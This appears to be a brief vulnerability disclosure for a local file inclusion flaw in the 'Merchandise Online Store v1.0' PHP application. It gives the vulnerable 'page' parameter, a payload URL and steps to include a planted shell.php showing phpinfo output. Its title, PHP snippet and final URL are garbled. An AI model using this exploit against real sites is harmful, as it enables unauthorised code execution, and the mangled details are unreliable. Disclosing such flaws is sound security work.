# Merchandise Online Store v1.0 by oretnom23 has The local file contains

vendor : https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: ip/vloggers_merch/admin/?page=

Vulnerability location: ip/vloggers_merch/admin/?page=, page

Payload: ip/vloggers_merch/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/166879194-6fb312af-fd3e-4df6-a8ef-fb2cdc6688b4.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/166879125-9036ece8-1c00-4a1f-b07d-81e46e432065.png)

And visit http://ip/vloggers_merch/?admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/166878978-3e2fcb95-b23f-40a4-bd24-c7a235bc8c9f.png)
